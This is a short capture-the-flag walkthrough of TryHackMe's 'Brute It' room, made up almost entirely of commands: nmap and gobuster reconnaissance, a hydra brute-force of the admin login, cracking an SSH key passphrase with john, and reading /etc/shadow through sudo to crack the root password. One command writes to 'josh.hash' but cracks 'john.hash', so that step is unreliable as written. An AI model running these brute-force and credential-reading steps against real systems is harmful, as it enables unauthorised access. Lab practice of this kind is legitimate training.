---
title: Walkthrough - Brute It
published: true
---

Learn how to brute, hash cracking and escalate privileges in this box!

[https://tryhackme.com/room/bruteit](https://tryhackme.com/room/bruteit)

* * *

## Search for open ports using nmap. How many ports are open?

- ``sudo nmap -Pn -sS -p- -T4 10.10.241.208 -vvv``

* * *

## What version of SSH is running?

- ``sudo nmap -sV -sT -sC -p22,80 10.10.241.208``

* * *

## What version of Apache is running?

- ``sudo nmap -sV -sT -sC -p22,80 10.10.241.208``

* * *

## Which Linux distribution is running?

- ``sudo nmap -sV -sT -sC -p22,80 10.10.241.208``

* * *

## Search for hidden directories on web server. What is the hidden directory?

- ``gobuster dir -u http://10.10.241.208 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --no-error``

* * *

## What is the user:password of the admin panel?

- Source code: ``<!-- Hey john, if you do not remember, the username is admin -->``
- ``hydra -l admin -P /usr/share/seclists/Passwords/rockyou.txt -t 16 10.10.241.208 http-post-form -m "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"``

* * *

## Crack the RSA key you found. What is John's RSA Private Key passphrase?

- ``ssh2john id_rsa > josh.hash && john john.hash --wordlist=/usr/share/seclists/Passwords/rockyou.txt``

* * *

## user.txt

- cat user.txt

* * *

## Web flag

- you get this in the ``/admin/`` panel after login

* * *

## What is the root's password?

- sudo cat /etc/shadow
- copy to attacker and run john with rockyou

* * *

## root.txt

- cat /root/root.txt

* * * 